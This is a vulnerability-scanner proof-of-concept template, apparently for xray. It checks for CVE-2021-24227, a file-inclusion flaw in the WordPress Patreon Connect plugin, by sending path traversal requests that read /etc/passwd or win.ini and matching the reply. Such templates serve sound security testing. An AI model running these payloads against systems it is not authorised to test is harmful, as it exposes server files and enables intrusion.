name: poc-yaml-wordpress-patreon-connect-cve-2021-24227-lfi
binding: 74fe504c-0aca-4641-9db4-16ee8b486fa6
manual: true
detail:
    author: socat
    links:
        - https://wpscan.com/vulnerability/f62df02d-7678-440f-84a1-ddbf09364016
    vulnerability:
        id: CT-150913
        level: high
transport: http
rules:
    linux:
        request:
            cache: true
            method: GET
            path: /?patron_only_image=../../../../../../../../../../etc/passwd&patreon_action=serve_patron_only_image
            follow_redirects: false
        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    windows:
        request:
            cache: true
            method: GET
            path: /?patron_only_image=../../../../../../../../../../windows/win.ini&patreon_action=serve_patron_only_image
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
expression: linux() || windows()
